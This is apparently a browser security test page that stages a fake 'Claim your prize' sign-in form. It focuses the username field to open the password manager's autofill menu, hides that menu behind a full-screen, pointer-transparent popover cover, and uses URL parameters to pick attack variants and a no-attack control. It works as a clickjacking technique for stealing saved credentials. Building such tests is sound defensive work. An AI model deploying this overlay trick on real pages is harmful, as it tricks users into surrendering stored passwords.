<!doctype html><title>Claim your prize</title><style>body{margin:0}#user{position:fixed;left:100px;top:100px}#pass{position:fixed;left:100px;top:130px}label{font-size:0}#go{position:fixed;left:400px;top:100px}</style><form id="f" action="#" onsubmit="event.preventDefault()"><label>Email <input id="user" name="email" autocomplete="username"></label><label>Password <input id="pass" name="password" type="password" autocomplete="current-password"></label><button id="go" type="submit">Sign in</button></form>
<div id="cover" popover="manual" style="position:fixed;inset:0;width:100vw;height:100vh;max-width:none;max-height:none;margin:0;border:0;padding:0;background:#fff;pointer-events:none;font:30px sans-serif"><div style="position:absolute;left:150px;top:160px;background:#2a7;color:#fff;padding:20px">CLAIM YOUR PRIZE</div></div>
<script>window.__log=[];window.__state=()=>({user:document.getElementById('user')?.value,pass:document.getElementById('pass')?.value,log:window.__log,origin:self.origin});const q=new URLSearchParams(location.search);const opener=(id)=>{const el=document.getElementById(id);if(q.get('how')==='focus')el.focus();else el.dispatchEvent(new FocusEvent('focusin',{bubbles:true,composed:true}));};
// A menu hidden by a cover that ignores the pointer. ?drop=1 takes the cover away at the press, when focus leaves. ?cover=0 is the control: no attack at all.
const cover=document.getElementById('cover');
addEventListener('load',()=>setTimeout(()=>{ opener('user');
 if(q.get('cover')==='0')return;
 setTimeout(()=>{ cover.showPopover();
  if(q.get('drop')==='1'){ const drop=()=>{ if(cover.matches(':popover-open')){cover.hidePopover();__log.push('dropped');} };
    addEventListener('blur',drop); (function poll(){ if(document.activeElement&&document.activeElement!==document.body&&document.activeElement.id!=='user')drop(); requestAnimationFrame(poll); })(); }
 },150);
},600));</script>
